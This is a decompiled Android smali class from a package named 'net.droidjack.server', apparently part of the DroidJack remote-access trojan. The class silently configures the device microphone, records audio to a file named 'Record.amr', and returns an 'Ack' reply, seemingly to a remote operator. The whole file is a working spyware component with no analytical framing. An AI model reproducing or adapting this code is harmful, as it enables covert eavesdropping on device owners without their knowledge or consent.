.class Lnet/droidjack/server/bq;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/bn;


# direct methods
.method constructor <init>(Lnet/droidjack/server/bn;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 3

    const/4 v2, 0x1

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Ljava/lang/Exception;

    const-string v1, "Cannot instantiate twice"

    invoke-direct {v0, v1}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    throw v0

    :cond_0
    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    new-instance v1, Landroid/media/MediaRecorder;

    invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V

    invoke-static {v0, v1}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;Landroid/media/MediaRecorder;)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioChannels(I)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    const/16 v1, 0x2b11

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSamplingRate(I)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    const/16 v1, 0x80

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncodingBitRate(I)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->d(Lnet/droidjack/server/bn;)Landroid/content/Context;

    move-result-object v0

    const-string v1, "Record.amr"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    iget-object v1, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v1}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0}, Lnet/droidjack/server/bn;->c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    iget-object v0, p0, Lnet/droidjack/server/bq;->a:Lnet/droidjack/server/bn;

    invoke-static {v0, v2}, Lnet/droidjack/server/bn;->a(Lnet/droidjack/server/bn;Z)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    return-object v0
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/bq;->a()[B

    move-result-object v0

    return-object v0
.end method
